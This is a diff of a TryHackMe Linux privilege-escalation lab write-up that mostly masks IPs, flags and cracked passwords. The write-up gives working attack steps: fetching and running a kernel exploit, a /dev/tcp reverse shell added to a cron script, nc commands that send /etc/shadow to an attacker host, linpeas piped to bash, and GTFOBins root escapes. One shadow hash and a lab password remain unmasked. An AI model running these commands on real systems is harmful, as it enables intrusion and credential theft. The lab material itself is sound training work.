@@ -2,6 +2,7 @@
 
 - [Linux PrivEsc](#linux-privesc)
     - [Enumeration](#enumeration)
+    - [Privilege Escalation: Kernel Exploits](#privilege-escalation-kernel-exploits)
     - [Privilege Esvalation: Sudo](#privilege-esvalation-sudo)
     - [Privilege Escalation: SUID](#privilege-escalation-suid)
     - [Privilege Escalation: Capabilities](#privilege-escalation-capabilities)
@@ -62,35 +63,37 @@ find / -perm -u=s -type f
 
 | Title | IP Address |
 | :---- | :---- |
-| LineKernel | 10.10.247.118 |
+| LineKernel | `1*.**.***.***` |
 
 ```bash
 hostname
 ```
 
-> `wade7363`
+> `w*******`
 
 ```bash
 uname -a
 ```
 
-> `3.13.0-24-generic`
+> `3.**.*-**-*******`
 
 ```bash
 cat /etc/issue
 ```
 
-> `Ubuntu 14.04 LTS`
+> `U***** 1*.** LTS`
 
 ```bash
 python --version
 ```
 
-> `2.7.6`
+> `*.*.*`
 
 Google: `3.13.0-24-generic`
 
-> `CVE-2015-1328`
+> `CVE-****-****`
+
+## Privilege Escalation: Kernel Exploits
 
 ```bash
 searchsploit linux kernel 3.13.0
@@ -99,32 +102,28 @@ searchsploit linux kernel 3.13.0
 > `linux/local/37292.c`
 
 ```bash
-cp /usr/share/exploitdb/exploits/linux/local/37292.c .
+searchsploit -m linux/local/37292.c
 python3 -m http.server 80   
 ```
 
-Victim:
+RHOST:
 
 ```bash
 cd /dev/shm
-wget http://<LOCALHOST>/37292.c
+wget http://1*.*.**.**/37292.c
 gcc 37292.c -o 37292
+chmod 700 37292
 ./37292
-``` 
-
-Find (flag1.txt)
-
-```bash
-find -type f -name flag1.txt
+find / -type f -name flag1.txt
 ```
 
-> `/home/matt/flag1.txt`
+> `/****/****/flag1.txt`
 
 ```bash
-cat /home/matt/flag1.txt
+cat /****/****/flag1.txt
 ```
 
-> `THM-28392872729920`
+> `THM-**************`
 
 ## Privilege Esvalation: Sudo
 
@@ -156,7 +155,7 @@ sudo LD_PRELOAD=/home/user/ldpreload/shell.so <SUDO-APP>
 
 | Title | IP Address |
 | :---- | :---- |
-| LinPrivEscSUDO | 10.10.66.29 |
+| LinPrivEscSUDO | `1*.**.**.**` |
 
 ```bash
 sudo -l
@@ -172,23 +171,23 @@ sudo -l
 find / -type f -name flag2.txt
 ```
 
-> `/home/ubuntu/flag2.txt`
+> `/****/******/flag2.txt`
 
 ```bash
-cat /home/ubuntu/flag2.txt
+cat /****/******/flag2.txt
 ```
 
-> `THM-402028394`
+> `THM-*********`
 
-Using [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo)
+Using [GTFOBins](https://gtfobins.github.io)
 
-> `sudo nmap --interactive`
+> `sudo nmap --***********`
 
 ```bash
 sudo less /etc/shadow
 ```
 
-> `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1`
+> `$*$*.*UUD*OLI*XK***$*I***FE************D*DHLHHP*X**I*.*N***/BJ****PRJW***WE**HH.**V***DE*W***C***B*****LR*`
 
 ## Privilege Escalation: SUID
 
@@ -210,93 +209,90 @@ openssl passwd -1 -salt <THM> <password1>
 
 | Title | IP Address |
 | :---- | :---- |
-| LinPrivEscSUID | 10.10.205.16 |
+| LinPrivEscSUID | `1*.**.***.**` |
 
 ```bash
 cat /etc/passwd
 ```
 
-> `gerryconway:x:1001:1001::/home/gerryconway:/bin/sh`
+> `g**********:x:1001:1001::/home/g**********:/bin/sh`
+
+Using [GTFOBins](https://gtfobins.github.io/):
 
 ```bash
 LFILE=/etc/shadow
 base64 "$LFILE" | base64 --decode
 ```
 
-Copy to `shadow`:
+- Copy
 
 ```bash
 cat /ect/passwd
 ```
 
-Copy to `passwd`:
+- Copy
 
+LHOST:
 
 ```bash
 unshadow passwd shadow > passwords
-```
-
-```bash
 john passwords
 ```
 
-> `Password1 (user2)`
+> `P******** (user2)`
 
 ```bash
 find -type f -name flag3.txt 2>/dev/null
 ```
 
-> `./home/ubuntu/flag3.txt`
+> `./****/******/flag3.txt`
 
 ```bash
-LFILE=/home/ubuntu/flag3.txt
+LFILE=/****/******/flag3.txt
 base64 "$LFILE" | base64 --decode
 ```
 
-> `THM-3847834`
+> `THM-*******`
 
 ## Privilege Escalation: Capabilities
 
 | Title | IP Address |
 | :---- | :---- |
-| LinPrivEscCAPA | 10.10.238.25 |
+| LinPrivEscCAPA | `1*.**.***.**` |
 
 ```bash
 getcap -r / 2>/dev/null
 ```
 
-> `/home/ubuntu/view = cap_setuid+ep`
+> `/home/ubuntu/**** = cap_setuid+ep`
 
-> `/home/karen/vim = cap_setuid+ep`
+> `/home/karen/*** = cap_setuid+ep`
 
 
-Using [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#capabilities)
-
-```bash
-./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
-```
+Using [GTFOBins](https://gtfobins.github.io)
 
 ```bash
+./*** -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 find / -type f -name flag4.txt 2>/dev/null
 ```
 
-> `./home/ubuntu/flag4.txt`
+> `./****/******/flag4.txt`
 
 ```bash
-cat /home/ubuntu/flag4.txt
+cat /****/******/flag4.txt
 ```
 
-> `THM-9349843`
+> `THM-*******`
 
 ## Privilege Escalation: Cron Jobs
+
+| Title | IP Address |
+| :---- | :---- |
+| LinPrivEscCRON | `1*.**.***.***` |
 
 ```bash
 cat /etc/crontab
 ```
-
-| Title | IP Address |
-| :---- | :---- |
-| LinPrivEscCRON | 10.10.119.243 |
 
 Append to `backup.sh`:
 
@@ -308,36 +304,34 @@ echo "bash -c 'exec bash -i &>/dev/tcp/10.6.31.75/8080 <&1'" >> backup.sh
 find / -type f -name flag5.txt 2>/dev/null
 ```
 
-> `/home/ubuntu/flag5.txt`
+> `/****/******/flag5.txt`
 
 ```bash
-cat /home/ubuntu/flag5.txt
+cat /****/******/flag5.txt
 ```
 
-> `THM-383000283`
-
-Host:
+> `THM-*********`
 
 ```bash
 nc -lvnp 80 > shadow
 nc -lvnp 81 > passwd
 ```
 
-Target:
+RHOST:
 
 ```bash
 nc -q 1 10.6.31.75 80 < /etc/shadow
 nc -q 1 10.6.31.75 81 < /etc/passwd
 ```
 
-Host:
+LHOST:
 
 ```bash
 unshadow passwd shadow > passwords
 john passwords
 ```
 
-> `123456 (matt)`
+> `1***** (matt)`
 
 ## Privilege Escalation: PATH
 
@@ -361,16 +355,16 @@ chmod 777 /tmp/thm
 
 | Title | IP Address |
 | :---- | :---- |
-| LinPrivEscPATH3 | 10.10.159.186 |
+| LinPrivEscPATH3 | `1*.**.***.***` |
 
 ```bash
 find / -writable 2>/dev/null
 ```
 
-> `/home/murdoch`
+> `/****/*******`
 
 ```bash
-cd /home/murdoch
+cd /****/*******
 ls -lah
 ```
 
@@ -390,13 +384,13 @@ export PATH=/tmp:$PATH
 find / -type f -name flag6.txt 2>/dev/null
 ```
 
-> `/home/matt/flag6.txt`
+> `/****/****/flag6.txt`
 
 ```bash
-cat /home/matt/flag6.txt
+cat /****/****/flag6.txt
 ```
 
-> `THM-736628929`
+> `THM-*********`
 
 ## Privilege Escalation: NFS
 
@@ -428,14 +422,14 @@ chmod +s nfs
 
 | Title | IP Address |
 | :---- | :---- |
-| LinPrivEscNFS | 10.10.203.44 |
+| LinPrivEscNFS | `1*.**.***.**` |
 
-Host:
+LHOST:
 
 ```bash
-showmount -e 10.10.203.44
+showmount -e 1*.**.***.**
 mkdir /tmp/sharedfolder
-sudo mount -o rw 10.10.203.44:/home/ubuntu/sharedfolder  /tmp/sharedfolder
+sudo mount -o rw 1*.**.***.**:/home/ubuntu/sharedfolder  /tmp/sharedfolder
 ```
 
 Copy the above payload to `/tmp/sharedfolder/payload.c`
@@ -446,7 +440,7 @@ sudo gcc payload.c -o payload -w
 sudo chmod +s payload
 ```
 
-Target:
+RHOST:
 
 ```bash
 cd /home/ubuntu/sharedfolder
@@ -454,67 +448,67 @@ cd /home/ubuntu/sharedfolder
 find / -type f -name flag7.txt
 ```
 
-> `/home/matt/flag7.txt`
+> `/****/****/flag7.txt`
 
 ```bash
-cat /home/matt/flag7.txt
+cat /****/****/flag7.txt
 ```
 
-> `THM-89384012`
+> `THM-********`
 
 ## Capstone Challenge
 
 | Title | IP Address | Username | Password |
 | :---- | :---- | :---- | :---- |
-| Linux Privesc Challenge | 10.10.0.209 | leonard | Penny123 |
+| Linux Privesc Challenge | `1*.**.*.***` | leonard | Penny123 |
 
-lhost:
+LHOST:
 
 ```bash
 nc -q 1 -lvnp 80 < linpeas.sh
 nc -lvnp 81 | tee lp.out
 ```
 
-rhost:
+RHOST:
 
 ```bash
 nc 10.6.31.75.80 | bash -s -a | nc 10.6.31.75 81
 ```
 
-Writable path:
+- Writable path:
 
 > `/home/leonard`/scripts:/usr/sue/bin:/usr/lib64/qt-3.3/bin:`/home/leonard/perl5`/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/opt/puppetlabs/bin:`/home/leonard/.local`/bin:`/home/leonard`/bin
 
-SUID:
+- SUID:
 
 > `-rwsr-xr-x. 1 root root 37K Aug 20  2019 /usr/bin/base64`
 
-Using [GTFOBins](https://gtfobins.github.io/gtfobins/base64/#suid)
-
-lhost:
+LHOST:
 
 ```bash
 nc -q 1 -lvnp 80 | tee shadow
 nc -q 1 -lvnp 81 | tee passwd
 ```
 
-rhost:
+Using [GTFOBins](https://gtfobins.github.io)
+
+RHOST:
 
 ```bash
-base64 "/etc/shadow" | base64 --decode | nc 10.6.31.75 80
-cat /etc/passwd | nc 10.6.31.75 81
+base64 "/etc/shadow" | base64 -d | nc 1*.*.**.** 80
+cat /etc/passwd | nc 1*.*.**.** 81
 ```
 
-lhost:
+LHOST:
 
 ```bash
 unshadow passwd shadow > passwords
 john passwords
 ```
 
-> `Password1 (missy)`
+> `P******** (missy)`
 
-Using `missy:Password1`:
+RHOST using `missy:P********`:
 
 ```bash
 su missy
@@ -527,21 +521,21 @@ sudo -l
 sudo find / -type f -name flag*.txt
 ```
 
-> `/home/missy/Documents/flag1.txt`
+> `/****/*****/D********/flag1.txt`
 
-> `/home/rootflag/flag2.txt`
+> `/****/********/flag2.txt`
 
 ```bash
-cat /home/missy/Documents/flag1.txt
+cat /****/*****/D********/flag1.txt
 ```
 
-> `THM-42828719920544`
+> `THM-**************`
 
-Using [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo)
+Using [GTFOBins](https://gtfobins.github.io)
 
 ```bash
 find . -exec /bin/sh \; -quit
-cat /home/rootflag/flag2.txt
+cat /****/********/flag2.txt
 ```
 
-> `THM-168824782390238`
+> `THM-***************`
